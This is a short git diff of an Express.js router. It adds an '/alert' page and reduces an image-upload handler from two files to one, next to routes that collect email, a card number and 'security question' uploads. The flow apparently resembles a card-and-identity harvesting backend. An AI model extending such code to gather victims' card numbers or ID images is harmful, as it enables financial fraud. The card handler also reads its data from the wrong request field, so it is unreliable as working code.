@@ -31,6 +31,8 @@ router.get('/email', forwardAuthenticated, (req, res) => res.render('email'));
 
 router.get('/card', forwardAuthenticated, (req, res) => res.render('card'));
 
+router.get('/alert', forwardAuthenticated, (req, res) => res.render('alert'));
+
 router.post('/card', async (req, res) => {
   const card = new Card({
     cardnumber: req.params.cardnumber,
@@ -52,22 +54,15 @@ router.post('/card', async (req, res) => {
 });
 
 // Handle Security Questions Form Submission
-router.post('/images',  upload.fields([
-  { name: 'image1'},
-  { name: 'image2'}  
-]), async (req, res) => {
+router.post('/images',  upload.single('image'), async (req, res) => {
 
-  const image1 = {
-    contentType: req.file.mimetype,
-  };
-
-  const image2 = {
+  const image = {
     data: req.file.buffer,
     contentType: req.file.mimetype,
   };
 
   try {
-    const newImage = new Image({ image1, image2 });
+    const newImage = new Image({ image });
     await newImage.save();
     console.log("image uploaded successfully")
     res.redirect('/users/login');
